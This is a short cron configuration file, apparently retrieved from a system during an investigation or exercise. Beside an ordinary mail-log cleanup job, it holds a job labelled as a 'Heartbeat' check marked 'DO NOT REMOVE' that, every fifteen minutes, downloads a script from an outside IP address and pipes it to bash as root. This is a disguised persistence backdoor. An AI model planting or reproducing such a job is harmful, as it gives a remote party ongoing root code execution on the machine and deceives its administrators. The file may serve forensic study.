# example-session/retrieved/etc/cron.d/maintenance
# System maintenance tasks
# Added by sysadmin 2019-08-14

# Clean up old mail logs
0 2 * * * root find /var/log/mail -mtime +30 -delete

# "Heartbeat" check - DO NOT REMOVE
 */15 * * * * root curl http://203.0.113.45/check-in.sh | bash
